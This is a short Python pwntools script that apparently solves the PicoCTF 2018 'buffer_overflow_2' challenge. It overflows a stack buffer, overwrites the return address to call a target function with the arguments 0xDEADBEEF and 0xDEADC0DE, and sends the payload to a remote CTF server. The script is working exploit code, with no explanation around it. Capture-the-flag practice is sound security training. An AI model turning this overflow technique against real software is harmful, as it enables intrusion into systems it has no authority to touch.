from pwn import *

elf = ELF('./PicoCTF_2018_buffer_overflow_2')

local = 0
if local == 1:
    io = process('./PicoCTF_2018_buffer_overflow_2')
else:
    io = remote('node4.buuoj.cn',25656)

payload = 'a'*0x6c+p32(0xdeadbeef)+p32(0x80485cb)+p32(0)+p32(0xDEADBEEF)+p32(0xDEADC0DE)
io.sendline(payload)

io.interactive()
